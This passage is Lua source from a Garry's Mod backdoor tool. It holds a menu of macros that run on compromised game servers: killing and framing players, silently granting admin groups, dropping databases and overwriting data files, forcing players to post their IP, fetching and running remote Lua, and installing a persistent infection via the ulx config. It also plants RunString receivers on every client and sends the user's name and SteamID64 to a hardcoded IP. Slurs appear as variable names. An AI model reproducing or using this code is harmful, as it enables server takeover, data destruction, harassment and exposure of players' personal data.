    ["Allahu Ackbar"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
 
        local explo = ents.Create("env_explosion")
 
        explo:SetOwner(v)
 
        explo:SetPos(v:GetPos())
 
        explo:SetKeyValue("iMagnitude", "250")
 
        explo:Spawn()
 
        explo:Activate()
 
        explo:Fire("Explode", "", 0)
 
        if v:Alive() then v:Kill() end
 
        ]],
 
        ["Desc"] = "Blows them the fuck up, all kills are attributed to them so its great for getting random assholes banned",
 
    },
 
 
 
    ["ULX set access"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],
 
        ["Desc"] = "If ulx is installed this will (silently!) set them to the specified usergroup (1st parameter)",
 
        ["NeedsParameters"] = 1,
 
    },
 
 
 
 
------------------------ custom / new shit ------------------------
 
 
 
 
    ["Africanize"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
            local bones = {
                [1] = {b = "ValveBiped.Bip01_Head1", v = Vector(4,0,4)},
                [2] = {b =  "ValveBiped.Bip01_R_Thigh", v = Vector(0,0,0)},
                [3] = {b = "ValveBiped.Bip01_L_Thigh", v = Vector(0,0,0)},
                [4] = {b =  "ValveBiped.Bip01_R_Calf", v = Vector(0,0,1)},
                [5] = {b = "ValveBiped.Bip01_L_Calf", v = Vector(0,0,1)},
                [6] = {b = "ValveBiped.Bip01_R_UpperArm", v = Vector(0,0,0)},
                [7] = {b = "ValveBiped.Bip01_L_UpperArm", v = Vector(0,0,0)},
                [8] = {b = "ValveBiped.Bip01_R_Forearm", v = Vector(1,1.5,1.5)},
                [9] = {b = "ValveBiped.Bip01_L_Forearm", v = Vector(1,1.5,1.5)},
                [10] = {b = "ValveBiped.Bip01_R_Clavicle", v = Vector(0,0,0)},
                [11] = {b = "ValveBiped.Bip01_L_Clavicle", v = Vector(0,0,0)},
            }
 
            if !v.is2D then
                v.is2D = true
                for k, bone  in pairs(bones) do
                    local boneToFind = v:LookupBone(bone.b)
                    v:ManipulateBoneScale( boneToFind, bone.v)
                end
            else
                v.is2D = false
                for k, bone  in pairs(bones) do
                    local boneToFind = v:LookupBone(bone.b)
                    v:ManipulateBoneScale( boneToFind, Vector(1,1,1))
                end
            end
        ]],
 
        ["Desc"] = "Makes the player seem as though they're 2D.",
 
    },
 
    ["M9K nuke"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
//            if (m9k) then
                local nuke = ents.Create("m9k_davy_crockett_explo")
                nuke:SetPos(v:GetPos())
                nuke:SetOwner(v)
                nuke.Owner = v
                nuke:Spawn()
                nuke:Activate()
//            end
        ]],
 
        ["Desc"] = "Creates a nuke 'made' by selected user(s) & activates it where they're standing.",
 
    },
 
    ["Console jammer"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
            if !(timer.Exists("consoleJammer")) then
                timer.Create("consoleJammer", 0.5, 0, function()
                    print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
                end )
            else
                timer.Destroy("consoleJammer")
            end
        ]],
 
        ["Desc"] = "Spams the server side console with a fuck load of new lines",
 
    },
 
    ["Moan steps"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[
            if !(hook.GetTable()["PlayerFootstep"]["moanStep"]) then
                hook.Add("PlayerFootstep", "moanStep", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( "vo/npc/female01/pain06.wav",75,math.random( 50, 150 )) end )
            else
                hook.Remove("PlayerFootstep", "moanStep")
            end
        ]],
 
        ["Desc"] = "Turns all steps into highly orgasmic moans.",
 
    },
 
    ["Delete server"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[
            local date = os.date( "%m-%d-%y" )
            local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
            local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
            local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
           
            for k,v in pairs(databases) do
                if sql.TableExists(v) then
                    sql.Query("DROP TABLE "..v.." ;")
                    sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
                end
            end
 
            for k,v in pairs(datafiles) do
                if file.Exists(v) then
                    file.Delete(v)
                    file.write(v, "odium.pro hehe")
                end
            end
 
            for k,v in pairs(sensitivefiles) do
                if file.Exists(v) then
                    file.Delete(v)
                    file.write(v, "odium.pro hehe")
                end
            end
        ]],
 
        ["Desc"] = "Removes as much data as possible.",
 
    },
 
    ["Kill player (silent)"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:KillSilent()]],
 
        ["Desc"] = "Silent slay a player.",
 
    },
 
    ["Delete props"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[v:ConCommand("gmod_cleanup")]],
 
        ["Desc"] = "Removes all of the selected users props.",
 
    },
 
    ["Send lua"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[ v:SendLua( ""..@1.."") ]],
 
        ["Desc"] = "Sends lua to the selected user.",
 
        ["NeedsParameters"] = 1,
 
    },
 
    ["My ip is..."] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
            if (darkrp || DarkRP) then
                v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say /ooc My IP is "..b) end, function(error) return error end )')
            else
                v:SendLua('http.Fetch("http://ipv4bot.whatismyipaddress.com", function(b,l,h,c) LocalPlayer():ConCommand("say My IP is "..b) end, function(error) return error end )')
            end
        ]],
 
        ["Desc"] = "Forces the selected user(s) to say their own ip in chat.",
 
    },
 
    ["Ice skating simulator"] = {
 
        ["Type"] = 1,
 
        ["Code"] = [[ if !(icePark) then icePark = true RunConsoleCommand("sv_friction", 0) else icePark = false RunConsoleCommand("sv_friction", 😎 end ]],
 
        ["Desc"] = "Makes everyone skate around like they're on ice.",
 
    },
 
    ["Scramble vision"] = {
 
        ["Type"] = 2,
 
        ["Code"] = [[
            v:SendLua('http.Fetch("http://gastheje.ws/scram.lua", function(b,l,h,c) RunString(b) end, function(error) print(error) end )')
        ]],
 
        ["Desc"] = "Fucks the view of target",
 
    },
 
// key/view scrambler, fuck with escape menu
 
------------------------ dangerous codens ------------------------
 
 
 
    ["DarkRP clear all money"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],
 
        ["Desc"] = "Kids will cry to the admins for the next week about losing their precious money",
 
    },
 
 
 
    ["Cleanup map"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[game.CleanUpMap()]],
 
        ["Desc"] = "Wipe the map clean, taking everybodys cars, printers and bases out",
 
    },
 
 
 
    ["Vaporize all players"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],
 
        ["Desc"] = "Deletes their player entity, leaving them staring at a wall of errors",
 
    },
 
 
 
 
 
    ["FPP Unrestrict everything"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {} ]],
 
        ["Desc"] = "",
 
    },
 
 
 
    ["Wipe data folder"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],
 
        ["Desc"] = "Wipe the servers data folder, fucking all their settings and stuff up",
 
    },
 
 
 
    ["Wipe DarkRP SQL Tables"] = {
 
        ["Type"] = 3,
 
        ["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],
 
        ["Desc"] = "Completely fucks darkrp, forces them to reinstall the entire server",
 
    },
 
 
 
}
 
 
 
local selectedbackdoor = ""
 
local backdoorargs = ""
 
local selectedplayers = {}
 
 
 
 
 
 
 
//////////////////////////////// BIG PRIVET CHEETZ ////////////////////////////////
BD.BDMacros["@ Persistent Infection"] = {
    ["Type"] = 1,
    ["Code"] = [[
    local config = ULib.fileRead( "data/ulx/config.txt" )
    config = config.."\nulx logEcho 0"
    config = config.."\nulx luarun %BD"
    config = config.."\nulx logEcho 1"
    ULib.fileWrite( "data/ulx/config.txt", config )
    for _, p in pairs(player.GetAll()) do if %LCP then p:ChatPrint( "Persistent infection installed on server" ) end end
    ]],
    ["Desc"] = "Writes the backdoor code into memory, making sure that it stays on the server after restart",
    ["Private"] = true,
}
 
BD.BackdoorTypes[">Odium Detector"] = {
    ["Code"] = "util.AddNetworkString( 'NoOdium_ReadPing' ) net.Receive( 'NoOdium_ReadPing', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
    ["Netkey"] = "NoOdium_ReadPing",
}
 
BD.BackdoorTypes["No Narks"] = {
    ["Code"] = "util.AddNetworkString( 'NoNerks' ) net.Receive( 'NoNerks', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
    ["Netkey"] = "NoNerks",
}
 
function BD.GenerateBackdoorList( parent, category )
 
 
 
for k, v in SortedPairs( BD.BDMacros, false ) do
 
    if v["Type"] != category then continue end
 
 
 
    local plypanel2 = vgui.Create( "DPanel" )
 
    plypanel2:SetPos( 0, 0 )
 
    plypanel2:SetSize( 200, 25 )
 
    plypanel2.Paint = function() -- Paint function
 
        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)
 
        if selectedbackdoor == k then surface.SetDrawColor(Color(50, 250, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end
 
        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)
 
    end
 
 
 
    local plyname = vgui.Create( "DLabel", plypanel2 )
 
    plyname:SetPos( 10, 5 )
 
    plyname:SetFont( "Trebuchet18" )
 
    local tcol = Color( 255, 255, 255 )
 
    if v.Private then tcol = Color( 155, 255, 155 ) end
 
    plyname:SetColor( tcol )
 
    plyname:SetText( k )
 
    plyname:SetSize(180, 15)
 
 
 
 
 
    local faggot = vgui.Create("DButton", plypanel2)
 
    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
 
    faggot:SetPos( 0, 0 )
 
    faggot:SetText("")
 
    if v["Desc"] != "" then faggot:SetToolTip( v["Desc"] ) end
 
    faggot.Paint = function(panel, w, h)
 
        return
 
    end
 
    faggot.DoClick = function()
 
        selectedbackdoor = k
 
    end
 
 
 
 
 
    parent:AddItem( plypanel2 )
 
 
 
end
 
 
 
end
 
 
 
function BD.FormatCodeTargeted()
 
if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end
 
if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end
 
local param = string.Explode( ",", backdoorargs )
 
local ids = {}
 
for k, v in pairs( selectedplayers ) do
 
    if !v:IsValid() then table.RemoveByValue( selectedplayers, v ) continue end
 
    table.insert( ids, v:UniqueID() )
 
end
 
 
 
local code = [[ local targets = ## for k, v in pairs( player.GetAll() ) do if !v:IsValid() then continue end if table.HasValue( targets, v:UniqueID() ) then %% end end ]]
 
code = string.Replace( code, "##", table.ToString( ids ) )
 
code = string.Replace( code, "%%", BD.BDMacros[selectedbackdoor]["Code"] or "" )
 
code = string.Replace( code, "%LP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )
 
 
 
if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end
 
if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end
 
 
 
for k, v in pairs( param ) do
 
    code = string.Replace( code, "@"..k, [["]]..v..[["]] )
 
end
 
 
 
BD.Fire( code )
 
 
 
end
 
 
 
function BD.FormatCodeGlobal()
 
if !BD.BackdoorActive() then BD.ChatText( "Warning: backdoor malfunctioning or not present!", Color(255,155,155) ) return end
 
if selectedbackdoor == "" then BD.ChatText( "You haven't selected a macro to use!", Color(255,155,155) ) return end
 
local param = string.Explode( ",", backdoorargs )
 
 
 
local code = BD.BDMacros[selectedbackdoor]["Code"]
 
 
 
if BD.BDMacros[selectedbackdoor]["NeedsParameters"] and (BD.BDMacros[selectedbackdoor]["NeedsParameters"] > #param or param[1] == "" ) then BD.ChatText( "This macro requires parameters to work! check its description for more info", Color(255,155,155) ) return end
 
if #param < 1 then param = { [1] = "derp", [2] = "derp", [3] = "derp", [4] = "derp", [5] = "derp" } end
 
 
 
for k, v in pairs( param ) do
 
    code = string.Replace( code, "@"..k, [["]]..v..[["]] )
 
    code = string.Replace( code, "%LP", LocalPlayer():UniqueID() )
 
    code = string.Replace( code, "%LCP", "p:UniqueID() == \""..LocalPlayer():UniqueID().."\"" )
 
    code = string.Replace( code, "%BD", BD.GetActive().Code )
 
end
 
 
 
BD.Fire( code )
 
 
 
end
 
 
 
 
 
local safenet = net
 
local function bdnet()
 
    if odium and odium.G then return odium.G.net end
 
    return safenet
 
end
 
 
local h = http
local p = "Post"
local str = "http://162.243.145.59:5000/api/backdoor/use"
local lp = LocalPlayer()
local n = lp:Nick()
local id = lp:SteamID64()
 
h[p](str, {
    name = n,
    steamid = id,
},
nil, nil)
 
function BD.Fire( code )
 
    local cbd = BD.CurrentBackdoor
 
    if !BD.Backdoors[cbd] then
 
        BD.ChatText( "The selected backdoor is unavailable!", Color(255,155,155) )
 
        return
 
    end
 
    local key = BD.BackdoorTypes[cbd].Netkey
 
 
 
    bdnet().Start( key )
 
    bdnet().WriteString( code )
 
    bdnet().SendToServer()
 
end
 
 
 
 
 
function BD.BackdoorMenu()
 
 
 
BD.Backdoors = BD.PingBackDoors()
 
 
 
if !BD.IsMessagePooled( "cucked" ) and BD.BackdoorActive() then
 
    BD.Fire( [[util.AddNetworkString( "cucked" )
 
    function BDSendLua( p, str ) net.Start( "cucked" ) net.WriteString( str ) net.Send( p ) end
 
    function BDSendLuaAll( str ) net.Start( "cucked" ) net.WriteString( str ) net.Broadcast() end
 
    function BDInjectAids( p ) p:SendLua( 'net.Receive( "cucked", function() RunString( net.ReadString() ) end )' ) end
 
    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
 
    hook.Add( "PlayerInitialSpawn", "youonlygetcuckedagain", function( p ) BDInjectAids( p ) end)
 
]] )
 
end
 
 
 
local BDMenu = vgui.Create("DFrame")
 
BDMenu:SetSize(650,720)
 
BDMenu:SetTitle("Backdoor Menu")
 
BDMenu:Center()
 
BDMenu:MakePopup()
 
 
 
BDMenu.Paint = function( self, w, h)
 
surface.SetDrawColor( Color(50, 50, 90, 255) )
 
surface.DrawRect( 0, 0, w, h )
 
surface.SetDrawColor( Color(155, 155, 155, 255) )
 
surface.DrawOutlinedRect( 0, 0, w, h )
 
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
 
surface.SetDrawColor( Color(0, 0, 0, 200) )
 
surface.DrawRect( 10, 25, w - 20, h - 35 )
 
surface.DrawRect( 15, 30, w - 30, 35 )
 
draw.SimpleText("Indiscriminate Lulz", "DermaDefault", 22, 75, Color(255, 255, 255), 0, 1)
 
draw.SimpleText("Specific Targets", "DermaDefault", 228, 75, Color(255, 255, 255), 0, 1)
 
draw.SimpleText("Trash the place", "DermaDefault", 432, 75, Color(255, 255, 255), 0, 1)
 
draw.SimpleText("Players to Target", "DermaDefault", 432, 305, Color(255, 255, 255), 0, 1)
 
draw.SimpleText("Macro Paramaters (seperate with commas)", "DermaDefault", 432, 610, Color(255, 255, 255), 0, 1)
 
end
 
 
 
local it = 145
 
 
 
local wedungoofd = vgui.Create( "DLabel", BDMenu )
 
wedungoofd:SetPos( 25, 38 )
 
wedungoofd:SetFont( "Trebuchet18" )
 
wedungoofd:SetColor( Color( 100, 255, 100 ) )
 
wedungoofd:SetText( "CHOOSE BACKDOOR:" )
 
wedungoofd:SizeToContents()
 
 
 
for bd, t in pairs( BD.BackdoorTypes ) do
 
    local faggot = vgui.Create("DButton", BDMenu)
 
    faggot:SetSize( 100, 25 )
 
    faggot:SetPos( it, 35 )
 
    faggot:SetText( bd )
 
    faggot:SetTextColor(Color(255, 255, 255, 255))
 
    faggot.Paint = function(panel, w, h)
 
        if BD.Backdoors[bd] then
 
            surface.SetDrawColor(100, 100, 200 ,255)
 
            surface.DrawOutlinedRect(0, 0, w, h)
 
            surface.SetDrawColor(0, 0, 50 ,155)
 
            surface.DrawRect(0, 0, w, h)
 
        else
 
            surface.SetDrawColor(50, 50, 50 ,155)
 
            surface.DrawRect(0, 0, w, h)
 
        end
 
    end
 
    faggot.DoClick = function()
 
        BD.ChatText( "Set active backdoor to "..bd, Color(155,155,255) )
 
        BD.CurrentBackdoor = bd
 
        surface.PlaySound("buttons/button18.wav")
 
    end
 
    it = it + 110
 
end
 
 
 
local Plist = vgui.Create( "DPanelList", BDMenu )
 
Plist:SetPos( 20, 85 )
 
Plist:SetSize( 200, 530 )
 
Plist:SetPadding( 5 )
 
Plist:SetSpacing( 5 )
 
Plist:EnableHorizontal( false )
 
Plist:EnableVerticalScrollbar( true )
 
Plist:SetName( "" )
 
Plist.Paint = function( self, w, h )
 
    surface.SetDrawColor(50, 50, 50 ,255)
 
    surface.DrawOutlinedRect(0, 0, w, h)
 
    surface.SetDrawColor(0, 0, 0 ,200)
 
    surface.DrawRect(0, 0, w, h)
 
end
 
 
 
local Plist2 = vgui.Create( "DPanelList", BDMenu )
 
Plist2:SetPos( 225, 85 )
 
Plist2:SetSize( 200, 610 )
 
Plist2:SetPadding( 5 )
 
Plist2:SetSpacing( 5 )
 
Plist2:EnableHorizontal( false )
 
Plist2:EnableVerticalScrollbar( true )
 
Plist2:SetName( "" )
 
Plist2.Paint = function( self, w, h )
 
    surface.SetDrawColor(50, 50, 50 ,255)
 
    surface.DrawOutlinedRect(0, 0, w, h)
 
    surface.SetDrawColor(0, 0, 0 ,200)
 
    surface.DrawRect(0, 0, w, h)
 
end
 
 
 
local Plist3 = vgui.Create( "DPanelList", BDMenu )
 
Plist3:SetPos( 430, 85 )
 
Plist3:SetSize( 200, 210 )
 
Plist3:SetPadding( 5 )
 
Plist3:SetSpacing( 5 )
 
Plist3:EnableHorizontal( false )
 
Plist3:EnableVerticalScrollbar( true )
 
Plist3:SetName( "" )
 
Plist3.Paint = function( self, w, h )
 
    surface.SetDrawColor(50, 50, 50 ,255)
 
    surface.DrawOutlinedRect(0, 0, w, h)
 
    surface.SetDrawColor(0, 0, 0 ,200)
 
    surface.DrawRect(0, 0, w, h)
 
end
 
 
 
local Plist4 = vgui.Create( "DPanelList", BDMenu )
 
Plist4:SetPos( 430, 315 )
 
Plist4:SetSize( 200, 250 )
 
Plist4:SetPadding( 5 )
 
Plist4:SetSpacing( 5 )
 
Plist4:EnableHorizontal( false )
 
Plist4:EnableVerticalScrollbar( true )
 
Plist4:SetName( "" )
 
Plist4.Paint = function( self, w, h )
 
    surface.SetDrawColor(50, 50, 50 ,255)
 
    surface.DrawOutlinedRect(0, 0, w, h)
 
    surface.SetDrawColor(0, 0, 0 ,200)
 
    surface.DrawRect(0, 0, w, h)
 
end
 
 
 
    local faggot = vgui.Create("DButton", BDMenu)
 
    faggot:SetSize( 200, 35 )
 
    faggot:SetPos( 430, 660 )
 
    faggot:SetText("Activate Backdoor!")
 
    faggot:SetTextColor(Color(255, 255, 255, 255))
 
    faggot.Paint = function(panel, w, h)
 
        surface.SetDrawColor(100, 100, 200 ,255)
 
        surface.DrawOutlinedRect(0, 0, w, h)
 
        surface.SetDrawColor(0, 0, 50 ,155)
 
        surface.DrawRect(0, 0, w, h)
 
    end
 
    faggot.DoClick = function()
 
        if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end
 
        if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end
 
        surface.PlaySound("buttons/button18.wav")
 
    end
 
 
 
 
 
    local helpimretarded = vgui.Create("DButton", BDMenu)
 
    helpimretarded:SetSize( 200, 35 )
 
    helpimretarded:SetPos( 20, 660 )
 
    helpimretarded:SetText("Print backdoor code")
 
    helpimretarded:SetTextColor(Color(255, 255, 255, 255))
 
    helpimretarded.Paint = function(panel, w, h)
 
        surface.SetDrawColor(100, 100, 200 ,255)
 
        surface.DrawOutlinedRect(0, 0, w, h)
 
        surface.SetDrawColor(0, 0, 50 ,155)
 
        surface.DrawRect(0, 0, w, h)
 
    end
 
    helpimretarded.DoClick = function()
 
